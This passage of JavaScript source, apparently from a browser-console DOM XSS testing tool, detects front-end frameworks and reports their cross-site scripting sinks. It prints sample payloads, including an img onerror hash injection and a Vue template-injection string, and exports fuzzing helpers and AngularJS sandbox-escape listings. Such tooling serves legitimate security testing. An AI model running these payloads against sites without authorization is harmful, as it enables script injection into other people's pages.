            const usesUserInput = /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*(?:props|state|this\.state|this\.props|location\.|document\.|window\.)/i.test(line);
            results.push({
              type: 'dangerouslySetInnerHTML',
              element: script.el,
              code: truncate(line.trim(), 200),
              risk: usesUserInput ? 'critical' : 'high',
              desc: usesUserInput
                ? 'dangerouslySetInnerHTML with user-controlled data'
                : 'dangerouslySetInnerHTML usage (check data source)',
              line: i + 1,
            });
          }
        }
      }

      // href="javascript:" in React rendered links
      document.querySelectorAll('a[href^="javascript:"]').forEach(el => {
        // React apps often render these from props
        results.push({
          type: 'javascript-href',
          element: el,
          code: truncate(el.outerHTML, 200),
          risk: 'high',
          desc: 'React-rendered link with javascript: protocol',
        });
      });

    } catch (e) { /* ignore */ }

    return results;
  }

  // =====================================================
  // printFrameworkReport()
  // Print a comprehensive styled report of all frameworks
  // and their XSS implications.
  // =====================================================
  function printFrameworkReport() {
    const fw = detectFrameworks();

    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', S.header);
    ns.log.info('%c\u2551   FRAMEWORK XSS REPORT                                \u2551', S.header);
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', S.header);
    ns.log.info(`%c   ${location.href}`, S.dim);
    ns.log.info('');

    const detected = [];
    const notDetected = [];

    // --- AngularJS ---
    if (fw.angular.detected) {
      detected.push('AngularJS');
      ns.log.info('%c\u2500\u2500 AngularJS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cDETECTED`, S.dim, S.green);
      ns.log.info(`%c   Version: %c${fw.angular.version || 'unknown'}`, S.dim, S.cyan);
      ns.log.info(`%c   ng-app: %c${fw.angular.hasNgApp ? 'YES' : 'NO'}`, S.dim, fw.angular.hasNgApp ? S.green : S.dim);
      ns.log.info(`%c   Strict DI: %c${fw.angular.strict ? 'YES' : 'NO'}`, S.dim, fw.angular.strict ? S.yellow : S.dim);

      if (fw.angular.version) {
        // Determine if sandbox is present
        const hasSandbox = compareVersions(fw.angular.version, '1.6.0') < 0;
        ns.log.info(`%c   Sandbox: %c${hasSandbox ? 'YES (v < 1.6)' : 'NO (v >= 1.6 — removed)'}`,
          S.dim, hasSandbox ? S.yellow : S.red);

        // List applicable sandbox escapes
        const escapes = ANGULAR_SANDBOX_ESCAPES.filter(esc =>
          compareVersions(fw.angular.version, esc.maxVer) <= 0
        );
        if (escapes.length > 0) {
          ns.log.info(`%c   Applicable escape payloads: %c${escapes.length}`, S.dim, S.orange);
          for (const esc of escapes.slice(0, 5)) {
            ns.log.info(`%c     [<= ${esc.maxVer}] %c${esc.desc}`, S.cyan, S.dim);
            ns.log.info(`%c     ${truncate(esc.payload, 120)}`, S.code);
          }
          if (escapes.length > 5) {
            ns.log.info(`%c     ... and ${escapes.length - 5} more`, S.dim);
          }
        }
      }

      // XSS implications
      ns.log.info(`\n%c   XSS Vectors:`, S.orange);
      ns.log.info(`%c     - Template injection via {{}} expressions`, S.dim);
      if (fw.angular.hasNgApp) {
        ns.log.info(`%c     - ng-app scope allows expression evaluation`, S.dim);
        ns.log.info(`%c     - Check: inject {{7*7}} in URL params/hash`, S.dim);
      }
      ns.log.info(`%c     - ng-bind-html with $sce.trustAsHtml() bypass`, S.dim);
      ns.log.info(`%c     - Run: %cdomxss.frameworks.angular()`, S.dim, S.magenta);

      // Check expression context
      const exprCtx = detectAngularExpressionContext();
      if (exprCtx.length > 0) {
        const injectable = exprCtx.filter(e => e.injectable);
        ns.log.info(`\n%c   Angular Expressions Found: %c${exprCtx.length}%c (${injectable.length} with user input)`,
          S.dim, S.cyan, S.dim);
        for (const ctx of injectable.slice(0, 3)) {
          ns.log.info(`%c     ${ctx.expression} in ${ctx.context}`, S.red);
          ns.log.info(`%c       Source: ${ctx.source} = "${truncate(ctx.inputValue, 40)}"`, S.yellow);
          if (ctx.element) {
            try { highlightEl(ctx.element, 'Angular Expression + User Input', 'fuzz-refl'); } catch (e) { /* ignore */ }
          }
        }
      }
      ns.log.info('');
    } else {
      notDetected.push('AngularJS');
    }

    // --- jQuery ---
    if (fw.jquery.detected) {
      detected.push('jQuery');
      ns.log.info('%c\u2500\u2500 jQuery \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cDETECTED`, S.dim, S.green);
      ns.log.info(`%c   Version: %c${fw.jquery.version || 'unknown'}`, S.dim, S.cyan);

      // Version-specific notes
      if (fw.jquery.version) {
        const major = parseInt(fw.jquery.version.split('.')[0], 10);
        const minor = parseInt(fw.jquery.version.split('.')[1], 10);
        if (major < 3 || (major === 3 && minor < 5)) {
          ns.log.info(`%c   WARNING: jQuery < 3.5 — $() parses HTML if string starts with <`, S.red);
          ns.log.info(`%c     $(location.hash) with hash "#<img src=x onerror=alert(1)>" = XSS`, S.orange);
        }
      }

      // Detect jQuery sinks
      const jqSinks = detectJQuerySinks();
      if (jqSinks.length > 0) {
        ns.log.info(`\n%c   jQuery Sinks Found: %c${jqSinks.length}`, S.dim, S.red);
        for (const sink of jqSinks.slice(0, 8)) {
          const icon = sink.risk === 'critical' ? '%c   CRITICAL' : '%c   HIGH    ';
          const iconStyle = sink.risk === 'critical' ? S.red : S.orange;
          ns.log.info(`${icon} %c${sink.desc}`, iconStyle, S.dim);
          ns.log.info(`%c     ${truncate(sink.code, 120)}`, S.code);
        }
        if (jqSinks.length > 8) {
          ns.log.info(`%c     ... and ${jqSinks.length - 8} more`, S.dim);
        }
      }

      ns.log.info(`\n%c   XSS Vectors:`, S.orange);
      ns.log.info(`%c     - Selector injection: $(location.hash) parses HTML`, S.dim);
      ns.log.info(`%c     - .html()/.append() with user-controlled data`, S.dim);
      ns.log.info(`%c     - hashchange + $() is a classic DOM XSS pattern`, S.dim);
      ns.log.info(`%c     - Run: %cdomxss.frameworks.jqueryHash()`, S.dim, S.magenta);
      ns.log.info('');
    } else {
      notDetected.push('jQuery');
    }

    // --- Vue.js ---
    if (fw.vue.detected) {
      detected.push('Vue.js');
      ns.log.info('%c\u2500\u2500 Vue.js \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cDETECTED`, S.dim, S.green);
      ns.log.info(`%c   Version: %c${fw.vue.version || 'unknown'}`, S.dim, S.cyan);
      ns.log.info(`%c   v-html directives: %c${fw.vue.hasVHtml ? 'YES' : 'NO'}`,
        S.dim, fw.vue.hasVHtml ? S.red : S.dim);

      const vueSinks = detectVueSinks();
      if (vueSinks.length > 0) {
        ns.log.info(`\n%c   Vue Sinks Found: %c${vueSinks.length}`, S.dim, S.red);
        for (const sink of vueSinks.slice(0, 5)) {
          ns.log.info(`%c   ${sink.risk.toUpperCase()} %c${sink.desc}`, S.red, S.dim);
          if (sink.element) {
            try { highlightEl(sink.element, `Vue: ${sink.type}`, 'fuzz-refl'); } catch (e) { /* ignore */ }
          }
        }
      }

      ns.log.info(`\n%c   XSS Vectors:`, S.orange);
      ns.log.info(`%c     - v-html renders raw HTML (like innerHTML)`, S.dim);
      ns.log.info(`%c     - Template injection if user input in Vue template`, S.dim);
      if (fw.vue.version && fw.vue.version.startsWith('2.')) {
        ns.log.info(`%c     - Vue 2.x: {{constructor.constructor('alert(1)')()}}`, S.dim);
      }
      ns.log.info('');
    } else {
      notDetected.push('Vue.js');
    }

    // --- React ---
    if (fw.react.detected) {
      detected.push('React');
      ns.log.info('%c\u2500\u2500 React \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cDETECTED`, S.dim, S.green);
      ns.log.info(`%c   dangerouslySetInnerHTML: %c${fw.react.hasDangerouslySet ? 'FOUND' : 'not found'}`,
        S.dim, fw.react.hasDangerouslySet ? S.red : S.dim);

      const reactSinks = detectReactSinks();
      if (reactSinks.length > 0) {
        ns.log.info(`\n%c   React Sinks Found: %c${reactSinks.length}`, S.dim, S.red);
        for (const sink of reactSinks.slice(0, 5)) {
          ns.log.info(`%c   ${sink.risk.toUpperCase()} %c${sink.desc}`, S.red, S.dim);
          ns.log.info(`%c     ${truncate(sink.code, 120)}`, S.code);
        }
      }

      ns.log.info(`\n%c   XSS Vectors:`, S.orange);
      ns.log.info(`%c     - dangerouslySetInnerHTML with user-controlled data`, S.dim);
      ns.log.info(`%c     - href="javascript:..." in React-rendered links`, S.dim);
      ns.log.info(`%c     - Server-side rendering (SSR) injection points`, S.dim);
      ns.log.info(`%c     - React is generally safe UNLESS dangerouslySetInnerHTML is used`, S.dim);
      ns.log.info('');
    } else {
      notDetected.push('React');
    }

    // --- Alpine.js ---
    if (fw.alpine.detected) {
      detected.push('Alpine.js');
      ns.log.info('%c\u2500\u2500 Alpine.js \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cDETECTED`, S.dim, S.green);
      ns.log.info(`%c   Version: %c${fw.alpine.version || 'unknown'}`, S.dim, S.cyan);
      ns.log.info(`%c   x-html directives: %c${fw.alpine.xHtmlCount || 0}`, S.dim, fw.alpine.hasXHtml ? S.red : S.dim);

      ns.log.info(`\n%c   XSS Vectors:`, S.orange);
      ns.log.info(`%c     - x-html directive sets innerHTML directly`, S.dim);
      ns.log.info(`%c     - x-data with user input in expressions`, S.dim);
      if (fw.alpine.hasXHtml) {
        ns.log.info(`%c     \u26A0\uFE0F x-html found — high XSS risk if expression uses user input`, S.red);
      }
      ns.log.info(`%c     - Run: %cdomxss.frameworks.alpine()`, S.dim, S.magenta);
      ns.log.info('');
    } else {
      notDetected.push('Alpine.js');
    }

    // --- htmx ---
    if (fw.htmx.detected) {
      detected.push('htmx');
      ns.log.info('%c\u2500\u2500 htmx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cDETECTED`, S.dim, S.green);
      ns.log.info(`%c   Version: %c${fw.htmx.version || 'unknown'}`, S.dim, S.cyan);
      ns.log.info(`%c   innerHTML swap: %c${fw.htmx.hasInnerHTMLSwap ? 'YES' : 'NO'}`, S.dim, fw.htmx.hasInnerHTMLSwap ? S.red : S.dim);

      ns.log.info(`\n%c   XSS Vectors:`, S.orange);
      ns.log.info(`%c     - hx-swap="innerHTML" injects server response into DOM`, S.dim);
      ns.log.info(`%c     - User-controlled hx-get/hx-post URLs → SSRF + XSS`, S.dim);
      ns.log.info(`%c     - hx-on attributes execute JS on htmx events`, S.dim);
      ns.log.info(`%c     - Run: %cdomxss.frameworks.htmx()`, S.dim, S.magenta);
      ns.log.info('');
    } else {
      notDetected.push('htmx');
    }

    // --- Trusted Types ---
    if (fw.trustedTypes.detected) {
      detected.push('Trusted Types');
      ns.log.info('%c\u2500\u2500 Trusted Types \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500', S.sep);
      ns.log.info(`%c   Status: %cACTIVE`, S.dim, S.yellow);
      ns.log.info(`%c   Policies: %c${fw.trustedTypes.policies.length > 0 ? fw.trustedTypes.policies.join(', ') : 'none discovered'}`,
        S.dim, S.cyan);

      if (fw.trustedTypes.policies.includes('default')) {
        ns.log.info(`%c   Default policy: %cYES — all DOM sinks go through it`, S.dim, S.orange);
        ns.log.info(`%c     Check if the default policy sanitizes properly or can be bypassed`, S.dim);
      }

      ns.log.info(`\n%c   Implications:`, S.orange);
      ns.log.info(`%c     - innerHTML/outerHTML/document.write require TrustedHTML`, S.dim);
      ns.log.info(`%c     - eval/setTimeout/setInterval require TrustedScript`, S.dim);
      ns.log.info(`%c     - Standard XSS payloads will be blocked`, S.dim);
      ns.log.info(`%c     - Look for: policy bypasses, createPolicy misuse, JSONP callbacks`, S.dim);
      ns.log.info(`%c     - Check: trustedTypes.createPolicy() calls for weak sanitizers`, S.dim);
      ns.log.info('');
    } else {
      notDetected.push('Trusted Types');
    }

    // --- Summary ---
    ns.log.info('%c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550', S.sep);

    if (detected.length > 0) {
      ns.log.info(`%c   Detected: %c${detected.join(', ')}`, S.title, S.cyan);
    } else {
      ns.log.info('%c   No major frameworks detected', S.dim);
    }

    if (notDetected.length > 0 && detected.length > 0) {
      ns.log.info(`%c   Not found: ${notDetected.join(', ')}`, S.dim);
    }

    ns.log.info('');
    ns.log.info('%c   Commands:', S.title);
    ns.log.info('%c     domxss.frameworks.report()       %c Full framework report', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.detect()      %c Detect frameworks (returns object)', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.angular()     %c AngularJS template injection test', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.jquery()      %c Find jQuery-specific sinks', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.jqueryHash()  %c jQuery hashchange XSS test', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.vue()         %c Find Vue.js sinks', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.react()       %c Find React sinks', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.alpine()      %c Find Alpine.js sinks', S.magenta, S.dim);
    ns.log.info('%c     domxss.frameworks.htmx()        %c Find htmx sinks', S.magenta, S.dim);
    ns.log.info('');

    return fw;
  }

  // =====================================================
  // Alpine.js Sink Detection
  // =====================================================
  function detectAlpineSinks() {
    const sinks = [];
    // x-html directly sets innerHTML — user-controlled expression = XSS
    document.querySelectorAll('[x-html]').forEach(el => {
      const expr = el.getAttribute('x-html');
      sinks.push({
        element: el, directive: 'x-html', expression: expr, risk: 'high',
        note: 'x-html directly sets innerHTML',
      });
    });
    // x-on event handlers may evaluate user input
    document.querySelectorAll('[x-on\\:click],[x-on\\:submit],[\\@click],[\\@submit]').forEach(el => {
      const handlers = [...el.attributes].filter(a => a.name.startsWith('x-on:') || a.name.startsWith('@'));
      for (const h of handlers) {
        sinks.push({
          element: el, directive: h.name, expression: h.value, risk: 'medium',
          note: 'Alpine.js event handler',
        });
      }
    });
    if (sinks.length > 0) {
      ns.log.info(`%c\uD83C\uDFD4\uFE0F Alpine.js: ${sinks.length} sink(s) found`, S.orange);
      for (const s of sinks) {
        ns.log.info(`   %c${s.directive}%c = %c${truncate(s.expression, 80)}%c (${s.risk})`,
          S.cyan, S.dim, S.code, S.dim);
      }
    }
    return sinks;
  }

  // =====================================================
  // htmx Sink Detection
  // =====================================================
  function detectHtmxSinks() {
    const sinks = [];
    document.querySelectorAll('[hx-get],[hx-post],[hx-put],[hx-delete]').forEach(el => {
      const swap = el.getAttribute('hx-swap') || 'innerHTML';
      const url = el.getAttribute('hx-get') || el.getAttribute('hx-post') ||
                  el.getAttribute('hx-put') || el.getAttribute('hx-delete');
      sinks.push({
        element: el, url, swapMode: swap,
        risk: swap === 'innerHTML' ? 'high' : 'medium',
        note: `htmx ${swap} swap`,
      });
    });
    if (sinks.length > 0) {
      ns.log.info(`%c\uD83D\uDD04 htmx: ${sinks.length} sink(s) found`, S.orange);
      for (const s of sinks) {
        ns.log.info(`   %c${truncate(s.url, 60)}%c swap=%c${s.swapMode}%c (${s.risk})`,
          S.cyan, S.dim, S.code, S.dim);
      }
    }
    return sinks;
  }

  // =====================================================
  // Export to namespace
  // =====================================================
  ns.frameworks = {
    detectFrameworks,
    detectAngularExpressionContext,
    fuzzAngular,
    detectJQuerySinks,
    fuzzJQueryHashchange,
    detectVueSinks,
    detectReactSinks,
    detectAlpineSinks,
    detectHtmxSinks,
    printFrameworkReport,
  };

})();
